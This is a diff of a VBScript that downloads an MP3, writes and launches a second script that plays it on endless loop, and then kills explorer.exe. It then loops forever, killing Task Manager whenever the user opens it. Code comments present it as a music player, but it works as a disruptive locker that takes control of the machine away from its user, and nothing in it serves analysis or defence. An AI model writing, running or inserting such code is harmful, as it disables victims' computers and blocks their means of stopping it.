@@ -1,3 +1,4 @@
+'init data
 Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
 Dim strUsername : strUsername = wshNetwork.UserName
 'Get music data
@@ -11,24 +12,47 @@ with bStrm
     .write xHttp.responseBody
     .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
 end with
-'Set music
+'Set music player sub folder
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+strUsername = CreateObject("WScript.Network").UserName
+strFolder = "C:\Users\" & strUsername & "\Downloads"
+strFile = strFolder & "\LemonZS.vbs"
+lines = Array( _
+    "Dim wshNetwork : Set wshNetwork = CreateObject(""WScript.Network"")", _
+    "Dim strUsername : strUsername = wshNetwork.UserName", _
+    "Set objShell = CreateObject(""WScript.Shell"")", _
+    "Set objWMPlayer = CreateObject(""WMPlayer.OCX"")", _
+    "strMusicPath = ""C:\Users\"" & strUsername & ""\Downloads\LemonZS.mp3""", _
+    "objWMPlayer.URL = strMusicPath", _
+    "objWMPlayer.settings.setMode ""loop"", True", _
+    "objWMPlayer.settings.setMode ""autoRewind"", True", _
+    "objWMPlayer.controls.play", _
+    "WScript.Sleep 2147483647", _ 
+    "Set objShell = Nothing", _
+    "Set objWMPlayer = Nothing" _
+)'maximum timing allowed is 2147483647
+Set objFile = objFSO.CreateTextFile(strFile, True)
+For Each line In lines
+    objFile.WriteLine line
+Next
+objFile.Close
+Set objFSO = Nothing
+'Call for sub folder
+WScript.Sleep 2000
 Set objShell = CreateObject("WScript.Shell")
-Set objWMPlayer = CreateObject("WMPlayer.OCX")
-strMusicPath = "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3"
-objWMPlayer.URL = strMusicPath
-objWMPlayer.settings.setMode "loop", True
-objWMPlayer.settings.setMode "autoRewind", True
-objWMPlayer.controls.play
-WScript.Sleep 86400000
+strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
+strBGM = strProfileFolder & "\Downloads\LemonZS.vbs"
+Set objNetwork = CreateObject("WScript.Network")
+strUsername = objNetwork.UserName
+objShell.Run strBGM
 Set objShell = Nothing
-Set objWMPlayer = Nothing
 ' Disable explorer.exe
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "taskkill /f /im explorer.exe", 0, True
 ' Disable Task Manager
 Do
     If IsTaskManagerOpen() Then
-        objShell.Run "taskkill /f /im Taskmgr.exe", 0, True
+        objShell.Run "taskkill /f /im Taskmgr.exe", 0, True 'close while testing
     End If
 Loop
 ' Function to check if Task Manager is open
@@ -41,5 +65,3 @@ Function IsTaskManagerOpen()
         IsTaskManagerOpen = False
     End If
 End Function
-
-
